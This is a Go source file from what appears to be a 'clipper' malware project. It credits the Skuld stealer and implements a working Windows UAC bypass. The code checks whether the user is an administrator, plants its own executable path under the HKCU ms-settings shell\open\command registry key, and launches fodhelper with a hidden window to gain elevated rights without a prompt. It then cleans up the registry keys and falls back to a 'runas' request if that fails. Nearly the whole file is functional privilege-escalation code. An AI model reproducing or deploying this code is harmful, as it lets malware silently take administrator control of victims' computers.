package uac

import (
	"os"
	"os/exec"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows/registry"

	"clipper/src/utils"
)

// https://github.com/hackirby/skuld/blob/main/modules/uacbypass/bypass.go

func canElevate() bool {
	var infoPointer unsafe.Pointer

	username, err := syscall.UTF16PtrFromString(os.Getenv("USERNAME"))
	if err != nil {
		return false
	}

	ret, _, _ := syscall.NewLazyDLL("netapi32.dll").NewProc("NetUserGetInfo").Call(
		0,
		uintptr(unsafe.Pointer(username)),
		1,
		uintptr(unsafe.Pointer(&infoPointer)),
	)

	if ret != 0 {
		return false
	}

	defer syscall.NewLazyDLL("netapi32.dll").NewProc("NetApiBufferFree").Call(uintptr(infoPointer))

	type userInfo1 struct {
		Username    *uint16
		Password    *uint16
		PasswordAge uint32
		Priv        uint32
		HomeDir     *uint16
		Comment     *uint16
		Flags       uint32
		ScriptPath  *uint16
	}

	info := (*userInfo1)(infoPointer)
	return info.Priv == 2
}

func elevate() error {
	k, _, err := registry.CreateKey(registry.CURRENT_USER,
		"Software\\Classes\\ms-settings\\shell\\open\\command", registry.ALL_ACCESS)
	if err != nil {
		return err
	}

	defer k.Close()

	value, err := os.Executable()
	if err != nil {
		return err
	}

	if err = k.SetStringValue("", value); err != nil {
		return err
	}
	if err = k.SetStringValue("DelegateExecute", ""); err != nil {
		return err
	}

	cmd := exec.Command("cmd.exe", "/C", "fodhelper")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = cmd.Run()
	if err != nil {
		return err
	}

	err = k.DeleteValue("")
	if err != nil {
		return err
	}

	err = k.DeleteValue("DelegateExecute")
	if err != nil {
		return err
	}

	return nil
}

func runAsAdmin() error {
	exePath, err := os.Executable()
	if err != nil {
		return err
	}

	shell32 := syscall.NewLazyDLL("shell32.dll")
	shellExecute := shell32.NewProc("ShellExecuteW")

	verb, _ := syscall.UTF16PtrFromString("runas")
	file, _ := syscall.UTF16PtrFromString(exePath)
	parameters, _ := syscall.UTF16PtrFromString("")
	directory, _ := syscall.UTF16PtrFromString("")
	showCmd := 1 // SW_SHOWNORMAL

	ret, _, err := shellExecute.Call(
		0,
		uintptr(unsafe.Pointer(verb)),
		uintptr(unsafe.Pointer(file)),
		uintptr(unsafe.Pointer(parameters)),
		uintptr(unsafe.Pointer(directory)),
		uintptr(showCmd),
	)

	if ret <= 32 {
		if err != nil {
			return err
		}
		return syscall.Errno(ret)
	}

	return nil
}

func IsElevated() bool {
	var token syscall.Token
	var isElevated bool
	var outLen uint32

	proc := syscall.MustLoadDLL("ntdll.dll").MustFindProc("NtQueryInformationToken")

	err := syscall.OpenProcessToken(syscall.Handle(os.Getpid()), syscall.TOKEN_QUERY, &token)
	if err != nil {
		return false
	}
	defer token.Close()

	err = syscall.GetTokenInformation(token, syscall.TokenElevation, (*byte)(unsafe.Pointer(&isElevated)), 4, &outLen)
	if err != nil {
		ret, _, _ := proc.Call(uintptr(token), uintptr(20),
			uintptr(unsafe.Pointer(&isElevated)),
			uintptr(4),
			uintptr(unsafe.Pointer(&outLen)))
		if ret != 0 {
			return false
		}
	}

	return isElevated
}

func RunBypass() {
	if utils.IsElevated() {
		return
	}

	if !canElevate() {
		return
	}

	err := elevate()
	if err != nil {
		err = runAsAdmin()
		if err != nil {
			return
		}
		os.Exit(0)
	}

	os.Exit(0)
}